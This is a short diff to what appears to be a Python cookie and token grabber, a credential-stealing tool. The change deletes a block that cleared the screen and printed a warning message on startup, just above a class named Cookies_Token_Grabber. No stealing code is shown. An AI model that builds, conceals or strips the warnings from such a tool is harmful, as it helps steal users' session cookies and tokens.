@@ -33,10 +33,6 @@ logging.basicConfig(
 TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
     getpass.getuser()) if os.name == "nt" else f"/tmp"
 
-# Print warning
-os.system("cls" if os.name == "nt" else "clear")
-with open("init_message.txt", "r") as file:
-    print(file.read() + '\n')
 
 class Cookies_Token_Grabber:
     def __init__(self):
